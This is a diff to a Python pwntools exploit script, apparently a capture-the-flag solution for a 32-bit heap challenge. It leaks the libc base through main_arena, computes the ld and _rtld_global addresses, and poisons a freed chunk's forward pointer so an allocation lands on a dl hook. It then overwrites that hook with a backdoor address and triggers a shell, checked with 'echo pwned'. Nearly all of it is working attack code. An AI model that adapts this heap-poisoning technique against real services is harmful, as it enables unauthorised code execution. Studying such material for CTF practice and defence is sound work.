@@ -56,20 +56,39 @@ def show(idx, size) -> bytes:
     return data
 
 def rtld_global():
-
     def leak_lib() -> int:
         add(0, 0x300)
         add(1, 0xc)
         dele(0)
         main_arena = u32(show(0, 0x4)) - 0x34
-        libc_base = main_arena - 0x13d7d4
+        libc_base = main_arena - 0x1447e4
         return libc_base
 
-    libc.address = leak_lib()
     ld = ELF('../lib/lib/ld-2.27.so')
-    io_list_all = libc.symbols['_IO_list_all']
+    libc.address = leak_lib()
+    ld.address = libc.address - 0x32000
     success(f"libc.address = {hex(libc.address)}")
-    success(f"io_list_all = {hex(io_list_all)}")
+    success(f"ld.address = {hex(ld.address)}")
+    rt_gl = ld.symbols['_rtld_global']
+    success(f"_rtld_global = {hex(rt_gl)}")
+    dl_hook = rt_gl + 0x7f0
+
+    back_door = 0x400918
+    add(0, 0xc)
+    add(1, 0xc)
+    add(2, 0xc)
+    add(3, 0xc)
+    dele(0)
+    dele(1)
+    dele(2)
+    edit(1, 0x4, p32(dl_hook))
+    add(3, 0xc)
+    add(4, 0xc)
+    add(5, 0xc)
+    edit(5, 0x4, p32(back_door))
+    cmd('5')
+    sl("")
+    sl("echo pwned")
 
 if __name__ == '__main__':
     rtld_global()
